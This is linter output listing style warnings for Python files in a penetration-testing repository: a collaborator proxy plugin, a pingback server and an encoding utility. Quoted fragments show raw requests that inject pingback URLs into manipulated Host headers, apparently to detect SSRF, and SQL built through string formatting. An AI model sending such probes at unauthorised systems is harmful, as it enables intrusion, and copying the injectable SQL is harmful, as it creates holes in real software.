263 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
264 | ΓÇª     requestData += "Accept: */*\r\n"
    |       ^^^^^^^^^^^
265 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:265:9
    |
263 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
264 |         requestData += "Accept: */*\r\n"
265 |         requestData += "Connection: close\r\n"
    |         ^^^^^^^^^^^
266 |
267 |         self.saveRequestForCorrelation(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:279:13
    |
277 |           )
278 |           self.logger.dbg(
279 | /             "(2) Re-sending host overriding request ({} -> {})".format(
280 | |                 self.request.path, pingback
281 | |             )
    | |_____________^
282 |           )
    |
help: Convert to f-string

F841 Local variable `url` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:286:9
    |
284 |     def hostAtManipulation(self):
285 |         (pingback, uuid) = ProxyHandler.getPingbackUrl(self.request)
286 |         url = urljoin(
    |         ^^^
287 |             self.request.scheme + "://", self.request.headers["Host"], self.request.path
288 |         )
    |
help: Remove assignment to unused variable `url`

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:291:9
    |
289 |         parsed = urlparse(pingback)
290 |
291 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |         ^^^^^^^^^^^
292 |         requestData += "Host: {}@{}\r\n".format(
293 |             self.request.headers["Host"], parsed.netloc
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:291:23
    |
289 |         parsed = urlparse(pingback)
290 |
291 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
292 |         requestData += "Host: {}@{}\r\n".format(
293 |             self.request.headers["Host"], parsed.netloc
    |
help: Convert to f-string

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:292:9
    |
291 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
292 |         requestData += "Host: {}@{}\r\n".format(
    |         ^^^^^^^^^^^
293 |             self.request.headers["Host"], parsed.netloc
294 |         )
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:295:9
    |
293 | ΓÇª         self.request.headers["Host"], parsed.netloc
294 | ΓÇª     )
295 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
    |       ^^^^^^^^^^^
296 | ΓÇª     requestData += "Accept: */*\r\n"
297 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:296:9
    |
294 | ΓÇª     )
295 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
296 | ΓÇª     requestData += "Accept: */*\r\n"
    |       ^^^^^^^^^^^
297 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:297:9
    |
295 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
296 |         requestData += "Accept: */*\r\n"
297 |         requestData += "Connection: close\r\n"
    |         ^^^^^^^^^^^
298 |
299 |         self.saveRequestForCorrelation(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:343:29
    |
342 |         try:
343 |             self.logger.dbg("GET {}".format(url))
    |                             ^^^^^^^^^^^^^^^^^^^^
344 |             requests.get(url, headers={"Host": parsed.netloc})
345 |         except Exception as e:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:346:29
    |
344 |             requests.get(url, headers={"Host": parsed.netloc})
345 |         except Exception as e:
346 |             self.logger.err("Could not issue request to ({}): {}".format(url, str(e)))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
347 |             if self.proxyOptions["debug"]:
348 |                 raise
    |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not rows:` for false checks
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:360:12
    |
359 |         rows = self.executeSql(query)
360 |         if rows == False:
    |            ^^^^^^^^^^^^^
361 |             return rows
362 |         for row in rows:
    |
help: Replace with `not rows`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:399:45
    |
397 |                     )
398 |                 self.saveRequestForCorrelation(
399 |                     pingback, header, uuid, "Header: {}".format(header)
    |                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
400 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:404:17
    |
402 |             self.sendMisroutedRequests()
403 |             self.logger.info(
404 |                 "Injected pingbacks for host ({}).".format(host), forced=True
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
405 |             )
    |
help: Convert to f-string

F401 [*] `urllib` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:13:8
   |
11 | import sys
12 | import threading
13 | import urllib
   |        ^^^^^^
14 | from http.server import BaseHTTPRequestHandler, HTTPServer
   |
help: Remove unused import: `urllib`

F401 [*] `pymysql` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:16:8
   |
14 | from http.server import BaseHTTPRequestHandler, HTTPServer
15 |
16 | import pymysql
   |        ^^^^^^^
17 | from Database import Database
18 | from Logger import *
   |
help: Remove unused import: `pymysql`

F403 `from Logger import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:18:1
   |
16 | import pymysql
17 | from Database import Database
18 | from Logger import *
   | ^^^^^^^^^^^^^^^^^^^^
19 |
20 | VERSION = "0.1"
   |

N816 Variable `databaseInstance` in global scope should not be mixedCase
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:47:1
   |
45 | }
46 |
47 | databaseInstance = None
   | ^^^^^^^^^^^^^^^^
   |

F405 `Logger` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:66:17
   |
64 |         except Exception as e:
65 |             if config["debug"]:
66 |                 Logger.dbg(
   |                 ^^^^^^
67 |                     "Failure along __init__ of BaseHTTPRequestHandler: {}".format(
68 |                         str(e)
   |

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:67:21
   |
65 |               if config["debug"]:
66 |                   Logger.dbg(
67 | /                     "Failure along __init__ of BaseHTTPRequestHandler: {}".format(
68 | |                         str(e)
69 | |                     )
   | |_____________________^
70 |                   )
71 |                   raise
   |
help: Convert to f-string

F541 [*] f-string without any placeholders
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:77:39
   |
76 |     def presentAtStart(self):
77 |         rows = databaseInstance.query(f"SELECT * FROM calledbacks")
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
78 |         if not rows:
79 |             return
   |
help: Remove extraneous `f` prefix

F841 Local variable `request` is assigned to but never used
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:81:13
   |
79 |             return
80 |         for row in rows:
81 |             request = databaseInstance.query(
   |             ^^^^^^^
82 |                 f"SELECT * FROM requests WHERE id = {row['requestid']}"
83 |             )
   |
help: Remove assignment to unused variable `request`

F405 `Logger` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:84:13
   |
82 |                 f"SELECT * FROM requests WHERE id = {row['requestid']}"
83 |             )
84 |             Logger.info(row["request"])
   |             ^^^^^^
85 |
86 |     def log_message(self, format, *args):
   |

N806 Variable `uuidRex` in function should be lowercase
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:90:9
   |
89 |     def extractUuid(self):
90 |         uuidRex = re.compile(r"(\bxxx[a-z0-9]{50}yyy\b)", re.I | re.M)
   |         ^^^^^^^
91 |
92 |         if "xxx" in self.path and "yyy" in self.path:
   |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:121:9
    |
119 |         try:
120 |             reverse = socket.gethostbyaddr(self.client_address[0])[0]
121 |         except:
    |         ^^^^^^
122 |             reverse = self.client_address[0]
123 |         message = f"""
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:149:9
    |
147 | """
148 |
149 |         Logger._out(message)
    |         ^^^^^^
150 |         return message
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:154:13
    |
152 |     def savePingback(self, requestid, message):
153 |         query = (
154 |             'INSERT INTO calledbacks(id, requestid, uuid, whereput) VALUES(%d, %d, "%s")'
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
155 |             % (0, requestid, message)
156 |         )
    |
help: Replace with format specifiers

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:157:9
    |
155 |             % (0, requestid, message)
156 |         )
157 |         Logger.dbg(f"Saving pingback: (requestid={str(requestid)})")
    |         ^^^^^^
158 |         Logger.dbg(query)
159 |         databaseInstance.insert(query)
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:158:9
    |
156 |         )
157 |         Logger.dbg(f"Saving pingback: (requestid={str(requestid)})")
158 |         Logger.dbg(query)
    |         ^^^^^^
159 |         databaseInstance.insert(query)
    |

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:176:25
    |
174 |     def send_header(self, name, value):
175 |         if name == "Server":
176 |             return super(PingbackServer, self).send_header(name, "nginx")
    |                         ^^^^^^^^^^^^^^^^^^^^^^
177 |         return super(PingbackServer, self).send_header(name, value)
    |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:177:21
    |
175 |         if name == "Server":
176 |             return super(PingbackServer, self).send_header(name, "nginx")
177 |         return super(PingbackServer, self).send_header(name, value)
    |                     ^^^^^^^^^^^^^^^^^^^^^^
178 |
179 |     def _set_response(self):
    |
help: Remove `super()` parameters

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:187:14
    |
185 |     def requestToString(request):
186 |         headers = "\r\n".join(
187 |             ["{}: {}".format(k, v) for k, v in request.headers.items()]
    |              ^^^^^^^^^^^^^^^^^^^^^
188 |         )
189 |         out = "{} {} {}\r\n{}".format(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:189:15
    |
187 |               ["{}: {}".format(k, v) for k, v in request.headers.items()]
188 |           )
189 |           out = "{} {} {}\r\n{}".format(
    |  _______________^
190 | |             request.command, request.path, request.request_version, headers
191 | |         )
    | |_________^
192 |           return out
    |
help: Convert to f-string

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:195:17
    |
194 |     def do_GET(self):
195 |         if not (self.client_address[0] in config["exclude-pingbacks-from-clients"]):
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
196 |             if config["debug"]:
197 |                 Logger.dbg(
    |
help: Convert to `not in`

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:197:17
    |
195 |         if not (self.client_address[0] in config["exclude-pingbacks-from-clients"]):
196 |             if config["debug"]:
197 |                 Logger.dbg(
    |                 ^^^^^^
198 |                     "--------------------------\nIncoming HTTP request from {}: {} {}".format(
199 |                         self.client_address[0], self.method, self.path[:25]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:198:21
    |
196 |               if config["debug"]:
197 |                   Logger.dbg(
198 | /                     "--------------------------\nIncoming HTTP request from {}: {} {}".format(
199 | |                         self.client_address[0], self.method, self.path[:25]
200 | |                     )
    | |_____________________^
201 |                   )
    |
help: Convert to f-string

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:203:17
    |
201 |                 )
202 |
203 |                 Logger.dbg(PingbackServer.requestToString(self) + "\n")
    |                 ^^^^^^
204 |
205 |             (where, uuid) = PingbackServer.extractUuid(self)
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:209:13
    |
207 |                 self.checkUuid(where, uuid)
208 |         else:
209 |             Logger.dbg(
    |             ^^^^^^
210 |                 "Skipping Client ({}) as it was excluded in config file.".format(
211 |                     self.client_address[0]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:210:17
    |
208 |           else:
209 |               Logger.dbg(
210 | /                 "Skipping Client ({}) as it was excluded in config file.".format(
211 | |                     self.client_address[0]
212 | |                 )
    | |_________________^
213 |               )
    |
help: Convert to f-string

N815 Variable `do_POST` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:218:5
    |
216 |         self.wfile.write(b"Ok")
217 |
218 |     do_POST = do_GET
    |     ^^^^^^^
219 |     do_DELETE = do_GET
220 |     do_PUT = do_GET
    |

N815 Variable `do_DELETE` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:219:5
    |
218 |     do_POST = do_GET
219 |     do_DELETE = do_GET
    |     ^^^^^^^^^
220 |     do_PUT = do_GET
221 |     do_OPTIONS = do_GET
    |

N815 Variable `do_PUT` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:220:5
    |
218 |     do_POST = do_GET
219 |     do_DELETE = do_GET
220 |     do_PUT = do_GET
    |     ^^^^^^
221 |     do_OPTIONS = do_GET
222 |     do_HEAD = do_GET
    |

N815 Variable `do_OPTIONS` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:221:5
    |
219 |     do_DELETE = do_GET
220 |     do_PUT = do_GET
221 |     do_OPTIONS = do_GET
    |     ^^^^^^^^^^
222 |     do_HEAD = do_GET
223 |     do_TRACE = do_GET
    |

N815 Variable `do_HEAD` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:222:5
    |
220 |     do_PUT = do_GET
221 |     do_OPTIONS = do_GET
222 |     do_HEAD = do_GET
    |     ^^^^^^^
223 |     do_TRACE = do_GET
224 |     do_CONNECT = do_GET
    |

N815 Variable `do_TRACE` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:223:5
    |
221 |     do_OPTIONS = do_GET
222 |     do_HEAD = do_GET
223 |     do_TRACE = do_GET
    |     ^^^^^^^^
224 |     do_CONNECT = do_GET
225 |     do_PATCH = do_GET
    |

N815 Variable `do_CONNECT` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:224:5
    |
222 |     do_HEAD = do_GET
223 |     do_TRACE = do_GET
224 |     do_CONNECT = do_GET
    |     ^^^^^^^^^^
225 |     do_PATCH = do_GET
    |

N815 Variable `do_PATCH` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:225:5
    |
223 |     do_TRACE = do_GET
224 |     do_CONNECT = do_GET
225 |     do_PATCH = do_GET
    |     ^^^^^^^^
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:297:9
    |
295 |     port = int(args.port)
296 |     if port < 1 or port > 65535:
297 |         Logger.err("Invalid port number. Must be in <1, 65535>")
    |         ^^^^^^
298 |         sys.exit(-1)
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:307:13
    |
305 |             or not args.mysql_pass
306 |         ):
307 |             Logger.warn(
    |             ^^^^^^
308 |                 "You shall specify all needed MySQL connection data either via program options or config file."
309 |             )
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:315:5
    |
313 |             config["mysql-user"] = args.mysql_user
314 |             config["mysql-pass"] = args.mysql_pass
315 |     except:
    |     ^^^^^^
316 |         Logger.warn(
317 |             "You shall specify all needed MySQL connection data either via program options or config file."
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:316:9
    |
314 |             config["mysql-pass"] = args.mysql_pass
315 |     except:
316 |         Logger.warn(
    |         ^^^^^^
317 |             "You shall specify all needed MySQL connection data either via program options or config file."
318 |         )
    |

N806 Variable `initQueries` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:333:5
    |
332 | def initDatabase():
333 |     initQueries = (
    |     ^^^^^^^^^^^
334 |         f"CREATE DATABASE IF NOT EXISTS {config['mysql-database']}",
335 |         f"""CREATE TABLE IF NOT EXISTS {config['mysql-database']}.requests (
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:356:5
    |
355 |     databaseInstance.databaseConnection.select_db(config["mysql-database"])
356 |     Logger.ok("Database initialized.")
    |     ^^^^^^
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:371:9
    |
369 |     opts = parseOptions(argv)
370 |     if not opts:
371 |         Logger.err("Options parsing failed.")
    |         ^^^^^^
372 |         return False
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:375:34
    |
374 |     if CONFIGURATION_FILE:
375 |         config.update(json.loads(open(CONFIGURATION_FILE).read()))
    |                                  ^^^^
376 |
377 |     if not connectToDatabase():
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:378:9
    |
377 |     if not connectToDatabase():
378 |         Logger.err("Could not connect to database: {}".format(config["mysql-host"]))
    |         ^^^^^^
379 |         sys.exit(-1)
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:383:5
    |
381 |     initDatabase()
382 |
383 |     Logger.dbg(
    |     ^^^^^^
384 |         "Local host's IP address (RHOST) set to: {}".format(
385 |             config["server-remote-addr"]
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:394:13
    |
392 |             server.server_version = "nginx"
393 |         except OSError as e:
394 |             Logger.err(f"Could not server on port {port}: {str(e)}")
    |             ^^^^^^
395 |             Logger.warn("Skipping...")
396 |             continue
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:395:13
    |
393 |         except OSError as e:
394 |             Logger.err(f"Could not server on port {port}: {str(e)}")
395 |             Logger.warn("Skipping...")
    |             ^^^^^^
396 |             continue
397 |             # return
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:408:17
    |
406 |                 )
407 |             except ssl.SSLError as e:
408 |                 Logger.warn(f"Could not serve HTTPS due to SSL error: {str(e)}")
    |                 ^^^^^^
409 |                 Logger.warn("Skipping...")
410 |                 continue
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:409:17
    |
407 |             except ssl.SSLError as e:
408 |                 Logger.warn(f"Could not serve HTTPS due to SSL error: {str(e)}")
409 |                 Logger.warn("Skipping...")
    |                 ^^^^^^
410 |                 continue
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:415:9
    |
413 |         thread.daemon = True
414 |         thread.start()
415 |         Logger.ok('Serving HTTP server on: ("{}", {})'.format(config["listen"], port))
    |         ^^^^^^
416 |
417 |     try:
    |

F405 `Logger` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-server.py:418:9
    |
417 |     try:
418 |         Logger.info("Entering infinite serving loop.")
    |         ^^^^^^
419 |         while True:
420 |             pass
    |

N806 Variable `nonBinary` in function should be lowercase
  --> security\penetration-testing-tools\web\reencode.py:55:13
   |
53 |         @staticmethod
54 |         def isBinaryData(data):
55 |             nonBinary = 0
   |             ^^^^^^^^^
56 |             percOfBinaryToAssume = 0.10
   |

N806 Variable `percOfBinaryToAssume` in function should be lowercase
  --> security\penetration-testing-tools\web\reencode.py:56:13
   |
54 |         def isBinaryData(data):
55 |             nonBinary = 0
56 |             percOfBinaryToAssume = 0.10
   |             ^^^^^^^^^^^^^^^^^^^^
57 |
58 |             for d in data:
   |

SIM114 [*] Combine `if` branches using logical `or` operator
  --> security\penetration-testing-tools\web\reencode.py:60:17
   |
58 |               for d in data:
59 |                   c = ord(d)
60 | /                 if c in (10, 13):
61 | |                     nonBinary += 1
62 | |                 elif c >= 0x20 and c <= 0x7F:
63 | |                     nonBinary += 1
   | |__________________________________^
64 |
65 |               binary = len(data) - nonBinary
   |
help: Combine `if` branches

N806 Variable `nonBinary` in function should be lowercase
  --> security\penetration-testing-tools\web\reencode.py:61:21
   |
59 |                 c = ord(d)
60 |                 if c in (10, 13):
61 |                     nonBinary += 1
   |                     ^^^^^^^^^
62 |                 elif c >= 0x20 and c <= 0x7F:
63 |                     nonBinary += 1
   |

N806 Variable `nonBinary` in function should be lowercase
  --> security\penetration-testing-tools\web\reencode.py:63:21
   |
61 |                     nonBinary += 1
62 |                 elif c >= 0x20 and c <= 0x7F:
63 |                     nonBinary += 1
   |                     ^^^^^^^^^
64 |
65 |             binary = len(data) - nonBinary
   |

SIM103 Return the condition `data` directly
  --> security\penetration-testing-tools\web\reencode.py:90:13
   |
89 |           def check(self, data):
90 | /             if not data:
91 | |                 return False
92 | |             return True
   | |_______________________^
93 |
94 |           def encode(self, data):
   |
help: Replace with `return data`

SIM103 Return the condition `bool(re.search(r"(?:%[0-9a-f]{2})+", data, re.I))` directly
   --> security\penetration-testing-tools\web\reencode.py:110:13
    |
108 |                   return True
109 |
110 | /             if re.search(r"(?:%[0-9a-f]{2})+", data, re.I):
111 | |                 return True
112 | |
113 | |             return False
    | |________________________^
114 |
115 |           def encode(self, data):
    |
help: Replace with `return bool(re.search(r"(?:%[0-9a-f]{2})+", data, re.I))`

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\reencode.py:127:13
    |
125 |           def check(self, data):
126 |               m = re.match(r"^[0-9a-f]+$", data, re.I)
127 | /             if m:
128 | |                 return True
129 | |             return False
    | |________________________^
130 |
131 |           def encode(self, data):
    |
help: Replace with `return bool(m)`

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\reencode.py:145:41
    |
143 |                 if base64.b64encode(base64.b64decode(data)) == data:
144 |                     m = re.match(
145 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                         ^^
146 |                         data,
147 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\reencode.py:145:63
    |
143 |                 if base64.b64encode(base64.b64decode(data)) == data:
144 |                     m = re.match(
145 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                               ^^
146 |                         data,
147 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\reencode.py:145:83
    |
143 |                 if base64.b64encode(base64.b64decode(data)) == data:
144 |                     m = re.match(
145 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                                                   ^^
146 |                         data,
147 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\reencode.py:145:102
    |
143 |                 if base64.b64encode(base64.b64decode(data)) == data:
144 |                     m = re.match(
145 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                                                                      ^^
146 |                         data,
147 |                         re.I,
    |
help: Use a raw string literal

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\reencode.py:149:21
    |
147 |                           re.I,
148 |                       )
149 | /                     if m:
150 | |                         return True
151 | |                     return False
    | |________________________________^
152 |               except:
153 |                   pass
    |
help: Replace with `return bool(m)`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\reencode.py:152:13
    |
150 |                         return True
151 |                     return False
152 |             except:
    |             ^^^^^^
153 |                 pass
154 |             return False
    |

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\reencode.py:170:40
    |
168 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
169 |                     m = re.match(
170 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                        ^^
171 |                         data,
172 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\reencode.py:170:62
    |
168 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
169 |                     m = re.match(
170 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                              ^^
171 |                         data,
172 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\reencode.py:170:82
    |
168 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
169 |                     m = re.match(
170 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                                                  ^^
171 |                         data,
172 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\reencode.py:170:101
    |
168 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
169 |                     m = re.match(
170 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                                                                     ^^
171 |                         data,
172 |                         re.I,
    |
help: Use a raw string literal

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\reencode.py:174:21
    |
172 |                           re.I,
173 |                       )
174 | /                     if m:
175 | |                         return True
176 | |                     return False
    | |________________________________^
177 |               except:
178 |                   pass
    |
help: Replace with `return bool(m)`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\reencode.py:177:13
    |
175 |                         return True
176 |                     return False
177 |             except:
    |             ^^^^^^
178 |                 pass
179 |             return False
    |

F821 Undefined name `JWTEncoder`
   --> security\penetration-testing-tools\web\reencode.py:201:37
    |
200 |         def encode(self, data):
201 |             return jwt.encode(data, JWTEncoder.secret)
    |                                     ^^^^^^^^^^
202 |
203 |         def decode(self, data):
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\reencode.py:217:13
    |
215 |                 if zlib.compress(zlib.decompress(data)) == data:
216 |                     return True
217 |             except:
    |             ^^^^^^
218 |                 pass
219 |             return False
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\reencode.py:259:16
    |
257 |     def verifyEncodings(self, encodings):
258 |         for encoder in encodings:
259 |             if type(encoder) == str:
    |                ^^^^^^^^^^^^^^^^^^^^
260 |                 if not encoder in self.encodersMap.keys():
261 |                     raise Exception("Passed unknown encoder's name.")
    |

